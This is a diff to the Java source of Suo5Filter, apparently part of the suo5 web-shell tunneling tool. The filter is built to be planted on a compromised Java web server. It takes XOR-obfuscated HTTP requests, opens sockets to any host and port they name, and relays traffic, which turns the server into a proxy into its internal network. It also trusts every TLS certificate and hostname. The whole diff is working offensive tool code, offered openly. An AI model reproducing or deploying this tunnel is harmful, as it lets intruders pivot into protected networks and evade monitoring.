@@ -15,8 +15,10 @@ import java.util.Date;
 import java.util.Enumeration;
 import java.util.HashMap;
 
-public class Suo5Filter implements Runnable, HostnameVerifier, X509TrustManager, Filter {
-    static HashMap addrs = collectAddr();
+public class Suo5Filter implements Filter, Runnable, HostnameVerifier, X509TrustManager {
+
+    public static HashMap addrs = collectAddr();
+    public static HashMap ctx = new HashMap();
 
     InputStream gInStream;
     OutputStream gOutStream;
@@ -68,26 +70,20 @@ public class Suo5Filter implements Runnable, HostnameVerifier, X509TrustManager,
         }
     }
 
-    public void readInputStreamWithTimeout(InputStream is, byte[] b, int timeoutMillis) throws IOException, InterruptedException {
+    public void readFull(InputStream is, byte[] b) throws IOException, InterruptedException {
         int bufferOffset = 0;
-        long maxTimeMillis = new Date().getTime() + timeoutMillis;
-        while (new Date().getTime() < maxTimeMillis && bufferOffset < b.length) {
+        while (bufferOffset < b.length) {
             int readLength = b.length - bufferOffset;
-            if (is.available() < readLength) {
-                readLength = is.available();
-            }
-            // can alternatively use bufferedReader, guarded by isReady():
             int readResult = is.read(b, bufferOffset, readLength);
             if (readResult == -1) break;
             bufferOffset += readResult;
-            Thread.sleep(200);
         }
     }
 
     public void tryFullDuplex(HttpServletRequest request, HttpServletResponse response) throws IOException, InterruptedException {
         InputStream in = request.getInputStream();
         byte[] data = new byte[32];
-        readInputStreamWithTimeout(in, data, 2000);
+        readFull(in, data);
         OutputStream out = response.getOutputStream();
         out.write(data);
         out.flush();
@@ -136,6 +132,18 @@ public class Suo5Filter implements Runnable, HostnameVerifier, X509TrustManager,
                 ((bytes[3] & 0xFF) << 0);
     }
 
+    synchronized void put(String k, Object v) {
+        ctx.put(k, v);
+    }
+
+    synchronized Object get(String k) {
+        return ctx.get(k);
+    }
+
+    synchronized Object remove(String k) {
+        return ctx.remove(k);
+    }
+
     byte[] copyOfRange(byte[] original, int from, int to) {
         int newLength = to - from;
         if (newLength < 0) {
@@ -178,9 +186,8 @@ public class Suo5Filter implements Runnable, HostnameVerifier, X509TrustManager,
     }
 
     private HashMap unmarshal(InputStream in) throws Exception {
-        DataInputStream reader = new DataInputStream(in);
         byte[] header = new byte[4 + 1]; // size and datatype
-        reader.readFully(header);
+        readFull(in, header);
         // read full
         ByteBuffer bb = ByteBuffer.wrap(header);
         int len = bb.getInt();
@@ -189,7 +196,7 @@ public class Suo5Filter implements Runnable, HostnameVerifier, X509TrustManager,
             throw new IOException("invalid len");
         }
         byte[] bs = new byte[len];
-        reader.readFully(bs);
+        readFull(in, bs);
         for (int i = 0; i < bs.length; i++) {
             bs[i] = (byte) (bs[i] ^ x);
         }
@@ -231,24 +238,25 @@ public class Suo5Filter implements Runnable, HostnameVerifier, X509TrustManager,
 
     private void processDataBio(HttpServletRequest request, HttpServletResponse resp) throws Exception {
         final InputStream reqInputStream = request.getInputStream();
-        final BufferedInputStream reqReader = new BufferedInputStream(reqInputStream);
-        HashMap dataMap;
-        dataMap = unmarshal(reqReader);
+        HashMap dataMap = unmarshal(reqInputStream);
 
         byte[] action = (byte[]) dataMap.get("ac");
         if (action.length != 1 || action[0] != 0x00) {
             resp.setStatus(403);
             return;
         }
-        resp.setBufferSize(8 * 1024);
+        resp.setBufferSize(512);
         final OutputStream respOutStream = resp.getOutputStream();
 
         // 0x00 create socket
         resp.setHeader("X-Accel-Buffering", "no");
-        String host = new String((byte[]) dataMap.get("h"));
-        int port = Integer.parseInt(new String((byte[]) dataMap.get("p")));
         Socket sc;
         try {
+            String host = new String((byte[]) dataMap.get("h"));
+            int port = Integer.parseInt(new String((byte[]) dataMap.get("p")));
+            if (port == 0) {
+                port = request.getLocalPort();
+            }
             sc = new Socket();
             sc.connect(new InetSocketAddress(host, port), 5000);
         } catch (Exception e) {
@@ -260,6 +268,7 @@ public class Suo5Filter implements Runnable, HostnameVerifier, X509TrustManager,
 
         respOutStream.write(marshal(newStatus((byte) 0x00)));
         respOutStream.flush();
+        resp.flushBuffer();
 
         final OutputStream scOutStream = sc.getOutputStream();
         final InputStream scInStream = sc.getInputStream();
@@ -269,7 +278,7 @@ public class Suo5Filter implements Runnable, HostnameVerifier, X509TrustManager,
             Suo5Filter p = new Suo5Filter(scInStream, respOutStream);
             t = new Thread(p);
             t.start();
-            readReq(reqReader, scOutStream);
+            readReq(reqInputStream, scOutStream);
         } catch (Exception e) {
 //                System.out.printf("pipe error, %s\n", e);
         } finally {
@@ -283,7 +292,6 @@ public class Suo5Filter implements Runnable, HostnameVerifier, X509TrustManager,
 
     private void readSocket(InputStream inputStream, OutputStream outputStream, boolean needMarshal) throws IOException {
         byte[] readBuf = new byte[1024 * 8];
-
         while (true) {
             int n = inputStream.read(readBuf);
             if (n <= 0) {
@@ -298,25 +306,26 @@ public class Suo5Filter implements Runnable, HostnameVerifier, X509TrustManager,
         }
     }
 
-    private void readReq(BufferedInputStream bufInputStream, OutputStream socketOutStream) throws Exception {
+    private void readReq(InputStream bufInputStream, OutputStream socketOutStream) throws Exception {
         while (true) {
             HashMap dataMap;
             dataMap = unmarshal(bufInputStream);
 
-            byte[] action = (byte[]) dataMap.get("ac");
-            if (action.length != 1) {
+            byte[] actions = (byte[]) dataMap.get("ac");
+            if (actions.length != 1) {
                 return;
             }
-            if (action[0] == 0x02) {
+            byte action = actions[0];
+            if (action == 0x02) {
                 socketOutStream.close();
                 return;
-            } else if (action[0] == 0x01) {
+            } else if (action == 0x01) {
                 byte[] data = (byte[]) dataMap.get("dt");
                 if (data.length != 0) {
                     socketOutStream.write(data);
                     socketOutStream.flush();
                 }
-            } else if (action[0] == 0x03) {
+            } else if (action == 0x03) {
                 continue;
             } else {
                 return;
@@ -327,15 +336,14 @@ public class Suo5Filter implements Runnable, HostnameVerifier, X509TrustManager,
     private void processDataUnary(HttpServletRequest request, HttpServletResponse resp) throws
             Exception {
         InputStream is = request.getInputStream();
-        ServletContext ctx = request.getSession().getServletContext();
         BufferedInputStream reader = new BufferedInputStream(is);
         HashMap dataMap;
         dataMap = unmarshal(reader);
 
 
         String clientId = new String((byte[]) dataMap.get("id"));
-        byte[] action = (byte[]) dataMap.get("ac");
-        if (action.length != 1) {
+        byte[] actions = (byte[]) dataMap.get("ac");
+        if (actions.length != 1) {
             resp.setStatus(403);
             return;
         }
@@ -345,6 +353,7 @@ public class Suo5Filter implements Runnable, HostnameVerifier, X509TrustManager,
                 ActionDelete    byte = 0x02
                 ActionHeartbeat byte = 0x03
              */
+        byte action = actions[0];
         byte[] redirectData = (byte[]) dataMap.get("r");
         boolean needRedirect = redirectData != null && redirectData.length > 0;
         String redirectUrl = "";
@@ -355,28 +364,29 @@ public class Suo5Filter implements Runnable, HostnameVerifier, X509TrustManager,
         }
         // load balance, send request with data to request url
         // action 0x00 need to pipe, see below
-        if (needRedirect && action[0] >= 0x01 && action[0] <= 0x03) {
+        if (needRedirect && action >= 0x01 && action <= 0x03) {
             HttpURLConnection conn = redirect(request, dataMap, redirectUrl);
             conn.disconnect();
             return;
         }
 
-        resp.setBufferSize(8 * 1024);
+        resp.setBufferSize(512);
         OutputStream respOutStream = resp.getOutputStream();
-        if (action[0] == 0x02) {
-            OutputStream scOutStream = (OutputStream) ctx.getAttribute(clientId);
-            if (scOutStream != null) {
-                scOutStream.close();
-            }
+        if (action == 0x02) {
+            Object o = this.get(clientId);
+            if (o == null) return;
+            OutputStream scOutStream = (OutputStream) o;
+            scOutStream.close();
             return;
-        } else if (action[0] == 0x01) {
-            OutputStream scOutStream = (OutputStream) ctx.getAttribute(clientId);
-            if (scOutStream == null) {
+        } else if (action == 0x01) {
+            Object o = this.get(clientId);
+            if (o == null) {
                 respOutStream.write(marshal(newDel()));
                 respOutStream.flush();
                 respOutStream.close();
                 return;
             }
+            OutputStream scOutStream = (OutputStream) o;
             byte[] data = (byte[]) dataMap.get("dt");
             if (data.length != 0) {
                 scOutStream.write(data);
@@ -387,13 +397,16 @@ public class Suo5Filter implements Runnable, HostnameVerifier, X509TrustManager,
         } else {
         }
 
-        if (action[0] != 0x00) {
+        if (action != 0x00) {
             return;
         }
         // 0x00 create new tunnel
         resp.setHeader("X-Accel-Buffering", "no");
         String host = new String((byte[]) dataMap.get("h"));
         int port = Integer.parseInt(new String((byte[]) dataMap.get("p")));
+        if (port == 0) {
+            port = request.getLocalPort();
+        }
 
         InputStream readFrom;
         Socket sc = null;
@@ -409,22 +422,24 @@ public class Suo5Filter implements Runnable, HostnameVerifier, X509TrustManager,
                 sc = new Socket();
                 sc.connect(new InetSocketAddress(host, port), 5000);
                 readFrom = sc.getInputStream();
-                ctx.setAttribute(clientId, sc.getOutputStream());
+                this.put(clientId, sc.getOutputStream());
                 respOutStream.write(marshal(newStatus((byte) 0x00)));
                 respOutStream.flush();
+                resp.flushBuffer();
             } catch (Exception e) {
-                ctx.removeAttribute(clientId);
+//                    System.out.printf("connect error %s\n", e);
+//                    e.printStackTrace();
+                this.remove(clientId);
                 respOutStream.write(marshal(newStatus((byte) 0x01)));
                 respOutStream.flush();
                 respOutStream.close();
                 return;
             }
         }
-
         try {
             readSocket(readFrom, respOutStream, !needRedirect);
         } catch (Exception e) {
-//                System.out.printf("pipe error, %s\n", e);
+//                System.out.println("socket error " + e.toString());
 //                e.printStackTrace();
         } finally {
             if (sc != null) {
@@ -434,7 +449,7 @@ public class Suo5Filter implements Runnable, HostnameVerifier, X509TrustManager,
                 conn.disconnect();
             }
             respOutStream.close();
-            ctx.removeAttribute(clientId);
+            this.remove(clientId);
         }
     }
 
@@ -499,9 +514,9 @@ public class Suo5Filter implements Runnable, HostnameVerifier, X509TrustManager,
         // ref: https://github.com/L-codes/Neo-reGeorg/blob/master/templates/NeoreGeorg.java
         if (HttpsURLConnection.class.isInstance(conn)) {
             ((HttpsURLConnection) conn).setHostnameVerifier(this);
-            SSLContext ctx = SSLContext.getInstance("SSL");
-            ctx.init(null, new TrustManager[]{this}, null);
-            ((HttpsURLConnection) conn).setSSLSocketFactory(ctx.getSocketFactory());
+            SSLContext sslCtx = SSLContext.getInstance("SSL");
+            sslCtx.init(null, new TrustManager[]{this}, null);
+            ((HttpsURLConnection) conn).setSSLSocketFactory(sslCtx.getSocketFactory());
         }
 
         Enumeration headers = request.getHeaderNames();
